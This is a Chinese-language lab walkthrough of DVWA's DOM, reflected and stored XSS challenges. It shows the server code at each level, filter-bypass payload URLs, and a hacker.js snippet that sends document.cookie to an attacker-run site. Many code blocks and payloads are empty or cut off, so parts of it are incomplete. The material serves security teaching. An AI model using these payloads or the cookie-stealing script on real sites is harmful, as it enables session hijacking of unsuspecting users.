document.referer 属性
window.name 属性
location 属性
innerHTML 属性
documen.write 属性
```
#### Low
**服务器端核心代码**
```php
```
简单直接,都告诉你了没有任何保护
**漏洞利用**
`http:///vulnerabilities/xss_d/?default=English`
#### Medium
**服务器端核心代码**
```php
```
**相关函数介绍**
array_key_exists() 函数检查某个数组中是否存在指定的键名,如果键名存在则返回 true,如果键名不存在则返回 false.
stripos() 函数查找字符串在另一字符串中第一次出现的位置
**漏洞利用**
这里就不用 `` 换一种方法
`http:///vulnerabilities/xss_d/?default=English`
#### High
**服务器端核心代码**
```php
/vulnerabilities/xss_d/?default=English #`
#### Impossible
**服务器端核心代码**
```php
```
---
### XSS(Reflected)
反射型 XSS,非持久化,需要欺骗用户自己去点击带有特定参数的 XSS 代码链接才能触发引起(服务器中没有这样的页面和内容),一般容易出现在搜索页面.
#### Low
**服务器端核心代码**
```php
Hello ' . $_GET['name'] . '';
}
```
可以看到,代码直接采用 get 方式传入了 name 参数,并没有任何的过滤与检查,存在明显的 XSS 漏洞.
**漏洞利用**
`` ,成功弹框:
相应的XSS链接
`http:///dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
**实战利用盗取用户 cookies 进入后台**
攻击者自己网站 http:///xss/ 里构造
hacker.js
```js
var img = new Image();
img.src="http:///xss/hacker.php?x=" + document.cookie;
document.body.append(img);
```
hacker.php
```php
```
于是插入 dvwa 的 xss payload 为 ``
XSS 利用,得到 cookies
#### Medium
**服务器端核心代码**
```php
', '', $_GET['name']);
    // Feedback for end user
    echo "Hello {$name}";
}
```
可以看到,这里对输入进行了过滤,基于黑名单的思想,使用 str_replace 函数将输入中的 `` 删除,这种防护机制是可以被轻松绕过的.
**漏洞利用**
1. 双写绕过
输入`/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
2. 大小写混淆绕过
输入``,成功弹框:
相应的 XSS 链接:
`http:///dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#`
#### High
**服务器端核心代码**
```php
Hello {$name}";
}
```
可以看到,High 级别的代码同样使用黑名单过滤输入,preg_replace() 函数用于正则表达式的搜索和替换,这使得双写绕过、大小写混淆绕过(正则表达式中 i 表示不区分大小写)不再有效.
**漏洞利用**
虽然无法使用 `` 标签注入 XSS 代码,但是可以通过 img、body 等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码.
输入 `` 或 `` ,成功弹框
#### Impossible
**服务器端核心代码**
```php
Hello {$name}";
}
// Generate Anti-CSRF token
generateSessionToken();
```
可以看到,Impossible 级别的代码使用 htmlspecialchars 函数把预定义的字符 &、"、 '、 转换为 HTML 实体,防止浏览器将其作为 HTML 元素.
---
### XSS(Stored)
#### Low
**服务器端核心代码**
```php
' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' );
    //mysql_close();
}
?>
```
可以看到,对输入并没有做 XSS 方面的过滤与检查,且存储在数据库中,因此这里存在明显的存储型 XSS 漏洞.
**相关函数介绍**
- **trim(string,charlist)**
	移除字符串两侧的空白字符或其他预定义字符,预定义字符包括 `、\t、\n、\x0B、\r` 以及空格,可选参数 charlist 支持添加额外需要删除的字符.
- **mysql_real_escape_string(string,connection)**
	函数会对字符串中的特殊符号 `\x00,\n,\r,\,‘,",\x1a` 进行转义.
- **stripslashes(string)**
	函数删除字符串中的反斜杠.
**漏洞利用**
name 一栏前端有字数限制,可以直接修改前端代码,也可以抓包修改
message 一栏输入 `` ,成功弹框
#### Medium
**服务器端核心代码**
```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));